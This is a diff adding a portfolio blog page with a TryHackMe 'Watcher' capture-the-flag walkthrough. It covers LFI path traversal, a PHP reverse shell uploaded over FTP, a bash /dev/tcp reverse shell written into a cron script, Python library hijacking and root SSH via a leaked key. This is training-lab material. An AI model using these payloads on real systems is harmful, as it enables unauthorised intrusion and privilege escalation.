@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Watcher CTF Writeup | Minimalist Portfolio</title>
+<link rel="stylesheet" href="/assets/css/style.css">
+
+<link rel="stylesheet" href="/assets/css/posts.css">
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Fira+Code:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+<link rel="icon" href="data:,">
+<meta name="description" content="Cybersecurity professional specializing in ethical hacking, penetration testing, and threat hunting.">
+<meta name="keywords" content="cybersecurity, ethical hacking, penetration testing, threat hunting, security analyst">
+</head>
+<body>
+  <!-- Spotlight Cursor Effect -->
+  <div class="spotlight"></div>
+
+  <header class="header-navbar">
+    <div class="header-inner">
+       <div class="logo-quack-wrap">
+                  <div class="logo">
+                    <span class="quack-text">QUACK</span>
+                    Gooduck
+                  </div>
+                </div>
+      <nav class="nav-links">
+        <a href="/#home">Home</a>
+        <a href="/#experience">Experience</a>
+        <a href="/#certifications">Certifications</a>
+        <a href="/write-ups.html" class="active">Write-ups</a>
+      </nav>
+      <div class="social-links">
+        <a href="https://github.com/yourusername" target="_blank"><i class="fab fa-github"></i></a>
+        <a href="https://linkedin.com/in/yourprofile" target="_blank"><i class="fab fa-linkedin"></i></a>
+        <a href="mailto:your.email@example.com"><i class="fas fa-envelope"></i></a>
+      </div>
+    </div>
+  </header>
+  <div class="container post-container">
+    <main>
+      <h1 id="tryhackme-watcher-writeup">TryHackMe: Watcher Writeup</h1>
+
+<table>
+  <tbody>
+    <tr>
+      <td><strong>Difficulty:</strong> Medium</td>
+      <td><strong>Focus:</strong> Linux, Boot2Root, Web, PrivEsc.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Room link: https://tryhackme.com/room/watcher</p>
+
+<p>Hey everyone! Today we’re diving into <strong>Watcher</strong>, a fun “boot2root” box on TryHackMe. This one is a great lesson in why you should never trust user input and, more importantly, why you should be careful with file permissions.</p>
+
+<h3 id="initial-setup">Initial Setup</h3>
+<p>First things first, let’s make our lives easier by mapping the IP to a hostname:</p>
+
+<p><code class="language-plaintext highlighter-rouge">echo '&lt;target_ip&gt; watcher.thm' &gt;&gt; /etc/hosts</code></p>
+
+<hr />
+
+<h2 id="1-scouting-the-perimeter-flag-1">1. Scouting the Perimeter (Flag 1)</h2>
+<p>I kicked things off with a standard nmap scan to see what we’re dealing with.</p>
+
+<p><code class="language-plaintext highlighter-rouge">nmap -v -p- watcher.thm</code></p>
+
+<p><strong>Open Ports:</strong></p>
+<ul>
+  <li><strong>21 (FTP):</strong> vsftpd 3.0.5</li>
+  <li><strong>22 (SSH):</strong> OpenSSH 8.2p1</li>
+  <li><strong>80 (HTTP):</strong> Apache 2.4.41</li>
+</ul>
+
+<p>Since there’s a web server, I fired up gobuster to see if there were any hidden gems.</p>
+
+<ul>
+  <li>/index.php (Status: 200)</li>
+  <li>/post.php (Status: 200)</li>
+  <li>/robots.txt (Status: 200)</li>
+</ul>
+
+<p>Navigating to robots.txt felt like hitting a mini-jackpot. It listed two files:</p>
+<ul>
+  <li>/flag_1.txt 👈 <strong>Found Flag 1!</strong></li>
+  <li>/secret_file_do_not_read.txt (This gave me a 403 Forbidden. Challenge accepted.)</li>
+</ul>
+
+<div class="post-img"><img src="/assets/img/watcher/1.png" alt="Alt text" /></div>
+
+<hr />
+
+<h2 id="2-exploiting-local-file-inclusion-flag-2">2. Exploiting Local File Inclusion (Flag 2)</h2>
+<p>Back on the main site, I noticed the URL looked a bit suspicious:</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://watcher.thm/post.php?post=striped.php</code></p>
+
+<p>That post= parameter is a classic sign of <strong>Local File Inclusion (LFI)</strong>. If the dev isn’t sanitizing that input, I might be able to read that “secret” file I couldn’t access earlier. I gave it a shot:</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://watcher.thm/post.php?post=./secret_file_do_not_read.txt</code></p>
+
+<p><strong>It worked!</strong> The file contained a message for “Mat” with some FTP credentials:</p>
+
+<div class="post-img"><img src="/assets/img/watcher/2.png" alt="Alt text" /></div>
+
+<p>I hopped over to the FTP server, logged in, and found <strong>Found Flag 2!</strong>.</p>
+
+<div class="post-img"><img src="/assets/img/watcher/3.png" alt="Alt text" /></div>
+
+<hr />
+
+<h2 id="3-from-lfi-to-rce-flag-3">3. From LFI to RCE (Flag 3)</h2>
+<p>The secret note mentioned that FTP files are saved to /home/ftpuser/ftp/files. This is huge. If I can upload a file via FTP and then use my LFI vulnerability to “include” it, I can get code execution (RCE).</p>
+
+<ol>
+  <li>I uploaded a simple PHP reverse shell (shell.php) via FTP.</li>
+  <li>
+    <p>I triggered it using the LFI:</p>
+
+    <p><code class="language-plaintext highlighter-rouge">http://watcher.thm/post.php?post=../../../home/ftpuser/ftp/files/shell.php</code></p>
+  </li>
+</ol>
+
+<p><em>Boom.</em> I had a shell as www-data. I ran a quick search to find the next flag:</p>
+
+<div class="post-img"><img src="/assets/img/watcher/4.png" alt="Alt text" /></div>
+
+<p><code class="language-plaintext highlighter-rouge">find / -type f -name 'flag_3.txt' 2&gt;/dev/null</code></p>
+
+<div class="post-img"><img src="/assets/img/watcher/5.png" alt="Alt text" /></div>
+
+<hr />
+
+<h2 id="4-exploiting-sudo-misconfigurations-flag-4">4. Exploiting Sudo Misconfigurations (Flag 4)</h2>
+<p>Time to move up in the world. I checked my sudo privileges with <strong>sudo -l</strong> and saw something beautiful:
+<strong>(toby) NOPASSWD: ALL</strong></p>
+
+<div class="post-img"><img src="/assets/img/watcher/6.png" alt="Alt text" /></div>
+
+<p>This means I can run anything as the user toby without a password. I just spawned a shell as him:</p>
+
+<p><code class="language-plaintext highlighter-rouge">sudo -u toby /bin/bash</code></p>
+
+<p>I headed over to /home/toby and picked up <strong>Flag 4</strong>.</p>
+
+<div class="post-img"><img src="/assets/img/watcher/7.png" alt="Alt text" /></div>
+
+<hr />
+
+<h2 id="5-the-second-pivot-mat-flag-5">5. The Second Pivot: Mat (Flag 5)</h2>
+<p>In Toby’s home directory, I found a note from “Mat” about cron jobs. Checking /etc/crontab, I saw this line:</p>
+
+<p><code class="language-plaintext highlighter-rouge">*/1 * * * * mat /home/toby/jobs/cow.sh</code></p>
+
+<p>Every minute, Mat runs a script located in Toby’s directory. Since I’m now Toby, I can edit that script! I replaced the contents of cow.sh with a bash reverse shell:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash 
+/bin/bash -i &gt;&amp; /dev/tcp/&lt;YOUR_IP&gt;/4445 0&gt;&amp;1
+</code></pre></div></div>
+
+<p>I set up my listener, waited a minute, and suddenly I was logged in as mat. <strong>Flag 5</strong> secured.</p>
+
+<div class="post-img"><img src="/assets/img/watcher/8.png" alt="Alt text" /></div>
+
+<hr />
+
+<h2 id="6-python-library-hijacking-flag-6">6. Python Library Hijacking (Flag 6)</h2>
+<p>Another user, another note. Mat had sudo rights to run a specific Python script as the user Will:</p>
+
+<div class="post-img"><img src="/assets/img/watcher/9.png" alt="Alt text" /></div>
+
+<p>Looking at will_script.py, it imports a function from another file in the same folder called cmd.py.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import os
+from cmd import get_command 
+</code></pre></div></div>
+
+<p>Since mat owns cmd.py, I can just hijack the library. I edited cmd.py and added a line to spawn a shell.</p>
+
+<div class="post-img"><img src="/assets/img/watcher/10.png" alt="Alt text" /></div>
+
+<p>When I ran the will_script.py with sudo, it called my “malicious” library, and I became will.</p>
+
+<p><code class="language-plaintext highlighter-rouge">sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py *</code></p>
+
+<div class="post-img"><img src="/assets/img/watcher/11.png" alt="Alt text" /></div>
+
+<p><strong>Flag 6</strong> found in /home/will.</p>
+
+<div class="post-img"><img src="/assets/img/watcher/12.png" alt="Alt text" /></div>
+
+<hr />
+
+<h2 id="7-exploiting-group-permissions-final-flag">7. Exploiting Group Permissions: Final Flag</h2>
+<p>Last step. I checked Will’s group memberships and found he was part of the adm group. This usually means access to logs or backups.</p>
+
+<p><code class="language-plaintext highlighter-rouge">find / -group adm 2&gt;/dev/null</code></p>
+
+<p>I found /opt/backups/key.b64. Decoding it revealed a <strong>Base64 encoded RSA private key</strong>.</p>
+
+<div class="post-img"><img src="/assets/img/watcher/13.png" alt="Alt text" /></div>
+
+<p>I saved it to my machine, fixed the permissions (chmod 600), and tried to SSH in as root:</p>
+
+<p><code class="language-plaintext highlighter-rouge">ssh -i key root@watcher.thm</code></p>
+
+<div class="post-img"><img src="/assets/img/watcher/14.png" alt="Alt text" /></div>
+
+<p>Success! I was root. I grabbed the final flag and cleared the machine.</p>
+
+<div class="post-img"><img src="/assets/img/watcher/15.png" alt="Alt text" /></div>
+
+    </main>
+  </div>
+
+  <script>
+    // Spotlight cursor effect
+    const spotlight = document.querySelector('.spotlight');
+
+    document.addEventListener('mousemove', (e) => {
+      const x = (e.clientX / window.innerWidth) * 100;
+      const y = (e.clientY / window.innerHeight) * 100;
+      spotlight.style.setProperty('--x', `${x}%`);
+      spotlight.style.setProperty('--y', `${y}%`);
+    });
+
+    // Focus effect for cards
+    document.addEventListener('DOMContentLoaded', () => {
+      const cards = document.querySelectorAll('.project-card, .job-item');
+
+      cards.forEach(card => {
+        card.addEventListener('mouseenter', () => {
+          document.body.classList.add('focus-mode');
+        });
+
+        card.addEventListener('mouseleave', () => {
+          document.body.classList.remove('focus-mode');
+        });
+      });
+
+      // Experience tabs functionality
+      const jobItems = document.querySelectorAll('.job-item');
+      const jobDetails = document.querySelector('.job-details');
+
+      jobItems.forEach((item, index) => {
+        item.addEventListener('click', () => {
+          // Remove active class from all items
+          jobItems.forEach(i => i.classList.remove('active'));
+          // Add active class to clicked item
+          item.classList.add('active');
+
+          // Update job details
+          const jobTitle = item.querySelector('h3').textContent;
+          const company = item.querySelector('.company').textContent;
+          const bullets = item.getAttribute('data-bullets').split('|');
+
+          jobDetails.querySelector('h3').textContent = jobTitle;
+          jobDetails.querySelector('.role').textContent = company;
+
+          // Update bullets
+          const ul = jobDetails.querySelector('ul');
+          ul.innerHTML = '';
+          bullets.forEach(bullet => {
+            const li = document.createElement('li');
+            li.textContent = bullet;
+            ul.appendChild(li);
+          });
+        });
+      });
+
+      // Navigation highlighting based on scroll position
+      const navLinks = document.querySelectorAll('.nav-links a');
+      const sections = document.querySelectorAll('section[id]');
+
+      function highlightNavOnScroll() {
+        const scrollY = window.pageYOffset;
+
+        sections.forEach(section => {
+          const sectionTop = section.offsetTop - 100; // Offset for better UX
+          const sectionHeight = section.offsetHeight;
+          const sectionId = section.getAttribute('id');
+
+          if (scrollY >= sectionTop && scrollY < sectionTop + sectionHeight) {
+            navLinks.forEach(link => {
+              link.classList.remove('active');
+              if (link.getAttribute('href') === `#${sectionId}`) {
+                link.classList.add('active');
+              }
+            });
+          }
+        });
+      }
+
+      // Smooth scrolling for navigation
+      navLinks.forEach(anchor => {
+        anchor.addEventListener('click', function (e) {
+          const href = this.getAttribute('href');
+          if (href.startsWith('#')) {
+            e.preventDefault();
+            const target = document.querySelector(href);
+            if (target) {
+              target.scrollIntoView({
+                behavior: 'smooth'
+              });
+            }
+          }
+          // For external links or page links, let them navigate normally
+        });
+      });
+    });
+  </script>
+</body>
+</html>
